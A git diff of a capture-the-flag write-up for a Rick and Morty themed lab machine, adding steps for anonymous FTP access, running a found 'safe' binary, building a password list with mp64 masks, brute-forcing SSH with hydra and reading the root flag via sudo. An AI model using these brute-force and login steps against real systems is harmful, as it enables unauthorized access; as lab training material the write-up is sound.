@@ -59,7 +59,8 @@ nmap -sC -sV -T4 < IP >
  * service running on PORT 60000 : unknown
 <br>
   
- * As the port 21 is open lets go for it :
+ * As the port 21 is OPEN to Anonymous lets go for it :<br>
+ * USERNAME : Anonymous<br>
  ```bash
  ftp <IP>
  ```
@@ -178,7 +179,65 @@ unzip -c journal.txt.zip
 ![rick 5 mortyssh 22222](https://user-images.githubusercontent.com/112984045/202864120-ccd0ab63-ae62-407b-a331-0579803a6965.png)
 
 <br>
+
 ## `POINTS : 70`
+<br>
+
+```bash
+cd /home/RickSanchez/RICKS_SAFE/
+```
+```bash
+cp safe /home/Summer/safeCP
+```
+```bash
+cd /home/Summer
+```
+```bash
+./safeCP 131333
+```
+* The number 131333 is at last flag stating towards safe
+![rick 6 rick safe](https://user-images.githubusercontent.com/112984045/202866379-4eb197cc-4911-445b-8c0c-6b6ee10df1df.png)
+<br>
+
+## `POINTS : 90`
+<br>
+
+
+* After a long search that was Rick's college band named ' The Flesh Clurtains'<br>
+* By using the instructions given , lets create a password's list:<br>
+<br>
+
+![rick fleshcurtains](https://user-images.githubusercontent.com/112984045/202867657-a7f34cf7-ed14-4b90-80a9-7753268040f7.png)
+
+<br>
+
+```bash
+touch passwords.txt
+```
+```bash
+mp64 ?u?dFles
+```
+```bash
+mp64 ?u?dCurtains
+```
+```bash
+hydra -l RickSanchez -P rick.txt ssh://< IP >:22222
+```
+![rick hydra rick](https://user-images.githubusercontent.com/112984045/202867705-99f3e60b-abdb-4582-abf3-a72f8bb9352d.png)<br>
+<br>
+
+```bash
+ssh RickSanchez@< IP > -p 22222
+```
+![rick ssh ricklongin](https://user-images.githubusercontent.com/112984045/202867963-40e16383-88af-4e63-88bd-e7fda246f40c.png)<br>
+```bash
+sudo head /root/FLAG.txt
+```
+![rick 7 rickflag](https://user-images.githubusercontent.com/112984045/202868052-66c12c24-f7f2-4ef6-825c-d594f835fb84.png)
+<br>
+
+## `POINTS : 120`
+
 
 <br>
 
@@ -191,7 +250,16 @@ unzip -c journal.txt.zip
 
 <br>
 
-## `POINTS : 80`
+## `POINTS : 130`
+
+<br>
+
+* Finally we are done with this machine....<br>
+* Successfully captured all the flag...<br>
+
+<br>
+
+### FOR ANY DOUBTS OR SUGGESTIONS DO WRITE TO shy.bu9@gmail.com
 
 
 
